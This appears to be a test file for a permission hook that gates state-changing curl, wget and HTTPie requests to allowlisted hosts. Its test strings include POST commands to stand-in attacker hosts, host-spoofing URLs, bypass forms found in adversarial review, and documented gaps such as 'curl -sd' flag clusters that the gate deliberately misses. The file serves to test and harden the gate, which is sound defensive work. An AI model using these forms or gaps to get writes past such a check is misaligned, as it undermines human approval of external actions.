/**
 * Adversarial unit tests for the external_write gate matcher.
 *
 * The matcher must fire on a state-changing HTTP request (curl -X/--request,
 * wget --method, or HTTPie positional form) targeting an allowlisted host,
 * and must NOT be spoofable into matching an allowlisted host via path,
 * query, userinfo, subdomain-suffix, or label-prefix tricks.
 */
import { describe, it, expect } from "vitest";
import { buildExternalWriteMatcher } from "../../plugin-hooks/dispatcher.mjs";

const HOST_RULE = {
  type: "external_write",
  decision: "ask",
  methods: ["POST", "PUT", "DELETE", "PATCH"],
  allowed_hosts: ["atlassian.net"],
};

describe("external_write — host+verb matching", () => {
  const m = buildExternalWriteMatcher(HOST_RULE);

  it.each([
    "curl -X POST https://x.atlassian.net/rest/api/2/issue",
    "curl --request DELETE https://atlassian.net/x",
    "curl -X post https://atlassian.net/x", // lowercase verb
    "curl -XPOST https://atlassian.net/x", // no space after -X
    "curl -X POST https://foo.bar.atlassian.net/x", // deep subdomain
    "wget --method=POST https://atlassian.net/x",
    "https POST atlassian.net/rest/api", // HTTPie positional, scheme-less host
    "https PUT https://atlassian.net/x", // HTTPie with explicit scheme
    "FOO=bar curl -X POST https://atlassian.net/x", // env prefix
  ])("fires on %s", (cmd) => {
    expect(m(cmd)).toBe(true);
  });

  it.each([
    "curl https://atlassian.net/x", // GET (no verb)
    "curl -X GET https://atlassian.net/x", // GET not in methods
    "curl -X POST https://evil.com/x", // host not allowlisted
    "curl -X POST https://evil.com/jira", // path token, host evil
    "curl -X POST https://evil.com/atlassian.net/x", // host in path
    "curl -X POST https://atlassian.net.evil.com/x", // suffix spoof
    "curl -X POST https://user:atlassian.net@evil.com/x", // userinfo spoof
    "curl -X POST https://evil-atlassian.net/x", // label-prefix spoof
    "curl -X POST https://notatlassian.net/x", // prefix spoof
    'echo "POST to https://atlassian.net"', // mention only, no verb flag
    "echo https POST atlassian.net", // not anchored at segment start
    "curl -x http://atlassian.net:8080 https://other.com/x", // -x is proxy, no method
    "curl -X POST https://attacker.com/?ref=atlassian.net", // allowlisted host only in query value
    "curl -d u=atlassian.net https://attacker.com/x", // allowlisted host only in -d data value
  ])("does NOT fire on %s", (cmd) => {
    expect(m(cmd)).toBe(false);
  });

  it("matches case-insensitively on the host", () => {
    expect(m("curl -X POST https://X.ATLASSIAN.NET/x")).toBe(true);
  });

  // ── regressions for bypasses found by adversarial review ──
  it.each([
    // host-spoofing forms that reach a real atlassian.net host
    "curl -X POST https://atlassian.net./api", // trailing-dot FQDN
    "curl -X POST https://foo.atlassian.net./api", // trailing-dot subdomain
    "curl -X POST atlassian.net/api", // scheme-less (curl defaults to http)
    "curl -X POST atlassian.net", // scheme-less bare host
    "curl -X POST https://a@b@atlassian.net/api", // multiple userinfo @, last wins
    "curl -X POST https:/atlassian.net/api", // single-slash scheme
    "curl -X \\\nPOST https://atlassian.net/x", // line continuation
    // method-implying flags without an explicit -X
    "curl -d '{\"summary\":\"x\"}' https://x.atlassian.net/rest/api/2/issue",
    "curl --data 'a=b' https://x.atlassian.net/x",
    "curl --data-raw '{}' https://acme.atlassian.net/x",
    "curl --data-binary @body.json https://acme.atlassian.net/x",
    "curl --data-urlencode 'a=b' https://acme.atlassian.net/x",
    "curl -F 'file=@a.png' https://acme.atlassian.net/secure/attachment",
    "curl --form 'file=@a.png' https://acme.atlassian.net/x",
    "curl --json '{\"a\":1}' https://acme.atlassian.net/rest/api/2/issue",
    "curl -T ./local.json https://acme.atlassian.net/x/upload", // PUT
    "curl --upload-file ./x https://acme.atlassian.net/x", // PUT
    "wget --post-data 'a=b' https://x.atlassian.net/x",
    "wget --post-file=body https://x.atlassian.net/x",
    "curl -X=POST https://x.atlassian.net/x",
    "curl -H 'X-HTTP-Method-Override: DELETE' https://x.atlassian.net/x -d a",
    // HTTPie forms
    "http --form POST https://x.atlassian.net/x", // flags before verb
    "http https://x.atlassian.net/rest/api/2/issue a=b", // implicit POST via body item
  ])("closes bypass: %s", (cmd) => {
    expect(m(cmd)).toBe(true);
  });

  // false-positive guards: method-implying flags only count for curl/wget,
  // and HTTPie query params (==) / no-item GETs must not look like writes.
  it.each([
    "grep -d skip atlassian.net", // grep -d (--directories), not an HTTP write
    "cat atlassian.net", // a file named like the host
    "http https://x.atlassian.net/x?a=b", // HTTPie GET with a URL query string
    "http https://x.atlassian.net/x q==v", // HTTPie query item (==), not a body
    "http https://x.atlassian.net/x", // HTTPie GET, no data items
  ])("does not false-fire on %s", (cmd) => {
    expect(m(cmd)).toBe(false);
  });

  // Command names resolve case-insensitively on case-insensitive filesystems.
  it.each([
    "CURL -X POST https://atlassian.net/api",
    "Curl -d a=b https://atlassian.net/x",
    "WGET --post-data a=b https://x.atlassian.net/x",
    "HTTP POST atlassian.net/x",
  ])("fires on case-variant command name %s", (cmd) => {
    expect(m(cmd)).toBe(true);
  });

  // Documented best-effort limitation: combined short-flag clusters that bury
  // the data/upload flag (e.g. -sd) cannot be regex-matched without false
  // positives on attached arguments (e.g. `-odraft.json`). These are deliberate
  // obfuscation, in the same category as shell-variable / command-substitution
  // indirection, and are documented as known gaps rather than matched.
  it.each([
    "curl -sd a=b https://x.atlassian.net/x",
    "curl -giT x https://x.atlassian.net/x",
  ])("does not catch obfuscated short-flag cluster %s (documented limitation)", (cmd) => {
    expect(m(cmd)).toBe(false);
  });
});

describe("external_write — write_cli", () => {
  const m = buildExternalWriteMatcher({
    type: "external_write",
    decision: "deny",
    methods: ["POST"],
    allowed_hosts: [],
    write_cli: ["glab mr create"],
  });

  it("fires on the configured write subcommand", () => {
    expect(m("glab mr create --title x")).toBe(true);
  });
  it("does not fire on a read subcommand", () => {
    expect(m("glab mr list")).toBe(false);
  });
});

describe("external_write — malformed rule throws", () => {
  it("throws on empty methods", () => {
    expect(() =>
      buildExternalWriteMatcher({ type: "external_write", methods: [], allowed_hosts: ["x"] }),
    ).toThrow();
  });
  it("throws on missing allowed_hosts", () => {
    expect(() =>
      buildExternalWriteMatcher({ type: "external_write", methods: ["POST"] }),
    ).toThrow();
  });
  it("throws on non-string write_cli", () => {
    expect(() =>
      buildExternalWriteMatcher({
        type: "external_write",
        methods: ["POST"],
        allowed_hosts: [],
        write_cli: [42],
      }),
    ).toThrow();
  });
});
